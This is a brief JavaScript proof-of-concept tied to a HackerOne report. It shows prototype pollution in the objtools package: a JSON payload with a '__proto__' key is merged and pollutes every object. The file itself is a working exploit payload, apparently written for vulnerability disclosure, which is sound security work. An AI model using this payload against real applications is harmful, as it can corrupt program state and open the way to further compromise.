//https://hackerone.com/reports/878394

const objtools = require('objtools');
const assert = require('assert');

const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');//payload

let obj = {};
console.log("Before : " + obj.polluted);
objtools.merge({}, payload);


assert(obj.polluted === "yes");
console.log("After : " + obj.polluted);
console.log("Payload succeeded");
